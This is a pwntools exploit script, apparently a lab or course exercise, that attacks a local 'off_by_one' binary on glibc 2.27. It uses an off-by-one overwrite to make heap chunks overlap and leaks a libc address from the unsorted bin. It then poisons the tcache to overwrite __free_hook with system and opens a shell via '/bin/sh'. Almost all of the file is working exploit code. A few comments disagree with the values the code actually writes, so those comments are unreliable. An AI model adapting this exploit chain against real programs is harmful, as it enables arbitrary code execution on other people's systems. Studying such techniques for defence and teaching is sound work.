#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./off_by_one')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./off_by_one")




## [Glibc 2.27 Off By One Attack Roadmap]
## 1. Modify size field to construct overlapped heap chunk to leak libc address
## 2. Again, use the overlapped heap chunk to modify fd of tcachebin
## 3. Modify free_hook to system




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking
alloc(0, 0x18)
alloc(1, 0x30)
alloc(2, 0x600)
alloc(3, 0x18)
alloc(4, 0x30)
alloc(5, 0x70)
alloc(6, 0x10)


## Note that size of chunk_0 is 0x18
## This is because the actual size of heap chunk is ⌈size + 8⌉ (⌈0x18 + 8⌉ = 0x20)

# struct malloc_chunk {

#   INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
#   INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

#   struct malloc_chunk* fd;         /* double links -- used only if free. */
#   struct malloc_chunk* bk;

#   /* Only used for large blocks: pointer to next larger size.  */
#   struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
#   struct malloc_chunk* bk_nextsize;
# };

# [chunk_0]
# {
    #0   INTERNAL_SIZE_T      prev_size;
    #8   INTERNAL_SIZE_T      size;
    #0x10   data                                [chunk_1]
    #0x18   data                                {
    #0x20   data         ***[Overlapped]***         #   INTERNAL_SIZE_T      prev_size;
# }                                                 #   INTERNAL_SIZE_T      size;
                                                    #   struct malloc_chunk* fd;
                                                    #   struct malloc_chunk* bk;
#                                               }  


## Use off by one to modify the size field of chunk_1 to be 0x61 (0x41 originally)
read(0, "a" * 0x18 + '\x51')



## Free chunk_1, since its size field is modified to 0x61, it would be placed into tcachebin(0x40)
## tcachebin(0x40) --> chunk_1
free(1)


## Then allocate a new heap chunk with size 0x40, it would be taken out from tachebin(0x40) chunk_1
## tcachebin(0x40) --> nullptr
## Since the actual size of chunk_1 is 0x20, it overlap with chunk_2
alloc(1, 0x40)


## Now we can free chunk_2, which would be placed into unsorted bin and get glibc address on it
free(2)


## Leak the address by chunk_1
read(1, "a" * 0x41)


## Since chunk 1 is in unsorted bin, the first 8 bytes is the address of unsorted bin
## unsorted_bin --> chunk 1 --> unsorted_bin
leak_addr = u64(write(1)[0x40 : 0x46] + "\x00\x00")


## Calculate system and free_hook address
libc_base = leak_addr - 0x3ebc61
system_addr = libc_base + 0x4f420
free_hook_addr = libc_base + 0x3ed8e8








## ---------------------- [Step 2] -------------------------- ##
## Perform attack again to modify fd of tcachebin
read(3, "a" * 0x18 + '\x61')


## Free chunk_4, since its size field is modified to 0x61, it would be placed into tcachebin(0x60)
## tcachebin(0x60) --> chunk_4
free(4)


## Take out from tcachebin(0x60)
alloc(4, 0x50)


## free chunk_5
## tcachebin(0x80) -> chunk_5
free(5)


## use chunk_4 to modify fd of chunk_5
## tcachebin(0x80) -> chunk_5 -> free_hook
read(4, "a" * 0x40 + p64(free_hook_addr) + "\n")


## chunk_7 would be overlapped with chunk_4
## tcache_bin(0x80) --> free_hook
alloc(7, 0x70)



## chunk_8 would be overlapped with free_hook
alloc(8, 0x70)








## ---------------------- [Step 3] -------------------------- ##
## Modify free_hook to be system
read(8, p64(system_addr) + "\n")


## The below operation would be system("/bin/sh")
read(7, "/bin/sh\n")
free(7)
p.interactive()